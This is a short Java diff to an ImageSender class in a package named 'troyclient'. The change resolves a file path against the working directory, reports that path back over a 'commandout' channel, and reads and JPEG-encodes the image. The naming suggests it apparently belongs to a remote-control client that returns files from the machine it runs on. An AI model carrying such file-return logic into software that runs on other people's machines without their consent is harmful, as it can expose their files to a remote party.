@@ -2,12 +2,11 @@ package ch.lebois.troyclient.service;
 
 
 import ch.lebois.troyclient.main.GetContext;
-
-import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
+import javax.imageio.ImageIO;
 
 /**
  * @PROJECT Hermann
@@ -18,7 +17,10 @@ public class ImageSender {
         BufferedImage bufferedImage;
         byte[] bytes;
         try {
-            bufferedImage = ImageIO.read(new File(path));
+            String fullPath = System.getProperty("user.dir") + "/" + path;
+            GetContext.SENDER.send("commandout", fullPath);
+
+            bufferedImage = ImageIO.read(new File(fullPath));
 
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
             ImageIO.write(bufferedImage, "jpg", byteArrayOutputStream);
